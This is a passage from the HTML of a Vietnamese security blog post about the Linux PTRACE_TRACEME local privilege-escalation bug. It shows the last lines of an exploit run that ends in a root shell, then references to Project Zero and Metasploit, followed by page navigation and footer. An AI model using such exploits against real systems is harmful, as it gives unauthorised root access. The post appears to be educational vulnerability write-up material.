</span></span><span class=line><span class=cl>executing passwd
</span></span><span class=line><span class=cl>attached to midpid
</span></span><span class=line><span class=cl><span class=o>[</span>root@antergos 47133<span class=o>]</span><span class=c1># id</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,985<span class=o>(</span>users<span class=o>)</span>,998<span class=o>(</span>wheel<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>root@antergos 47133<span class=o>]</span><span class=c1># exit</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=tài-liệu-tham-khảo>Tài liệu tham khảo<a hidden class=anchor aria-hidden=true href=#tài-liệu-tham-khảo>#</a></h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903">https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</a>
<a href=https://github.com/rapid7/metasploit-framework/issues/12104>https://github.com/rapid7/metasploit-framework/issues/12104</a>
<a href=https://0day.life/exploit/0day-636.html>https://0day.life/exploit/0day-636.html</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/cybersecurity/>CyberSecurity</a></li><li><a href=https://minhtuanact.github.io/tags/linux/>Linux</a></li><li><a href=https://minhtuanact.github.io/tags/cve/>CVE</a></li><li><a href=https://minhtuanact.github.io/tags/kernel/>Kernel</a></li><li><a href=https://minhtuanact.github.io/tags/root-privileges/>root privileges</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/tao-vo-van-lenh-shell-chiem-quyen-truy-cap-bang-cong-cu-shellpop-tren-linux/><span class=title>« Prev</span><br><span>Tạo vô vàn lệnh shell chiếm quyền truy cập bằng công cụ Shellpop trên Linux</span></a>
<a class=next href=https://minhtuanact.github.io/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/><span class=title>Next »</span><br><span>VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux on twitter" href="https://twitter.com/intent/tweet/?text=Linux%3a%20broken%20permission%20and%20object%20lifetime%20handling%20for%20PTRACE_TRACEME%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20root%20h%e1%ba%a7u%20h%e1%ba%bft%20c%c3%a1c%20m%c3%a1y%20ch%e1%ba%a1y%20Linux&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2flinux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux%2f&hashtags=CyberSecurity%2cLinux%2cCVE%2cKernel%2crootprivileges"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2flinux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux%2f&title=Linux%3a%20broken%20permission%20and%20object%20lifetime%20handling%20for%20PTRACE_TRACEME%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20root%20h%e1%ba%a7u%20h%e1%ba%bft%20c%c3%a1c%20m%c3%a1y%20ch%e1%ba%a1y%20Linux&summary=Linux%3a%20broken%20permission%20and%20object%20lifetime%20handling%20for%20PTRACE_TRACEME%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20root%20h%e1%ba%a7u%20h%e1%ba%bft%20c%c3%a1c%20m%c3%a1y%20ch%e1%ba%a1y%20Linux&source=https%3a%2f%2fminhtuanact.github.io%2fposts%2flinux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2flinux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux%2f&title=Linux%3a%20broken%20permission%20and%20object%20lifetime%20handling%20for%20PTRACE_TRACEME%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20root%20h%e1%ba%a7u%20h%e1%ba%bft%20c%c3%a1c%20m%c3%a1y%20ch%e1%ba%a1y%20Linux"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2flinux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux on whatsapp" href="https://api.whatsapp.com/send?text=Linux%3a%20broken%20permission%20and%20object%20lifetime%20handling%20for%20PTRACE_TRACEME%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20root%20h%e1%ba%a7u%20h%e1%ba%bft%20c%c3%a1c%20m%c3%a1y%20ch%e1%ba%a1y%20Linux%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2flinux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux on telegram" href="https://telegram.me/share/url?text=Linux%3a%20broken%20permission%20and%20object%20lifetime%20handling%20for%20PTRACE_TRACEME%20-%20Chi%e1%ba%bfm%20quy%e1%bb%81n%20root%20h%e1%ba%a7u%20h%e1%ba%bft%20c%c3%a1c%20m%c3%a1y%20ch%e1%ba%a1y%20Linux&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2flinux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>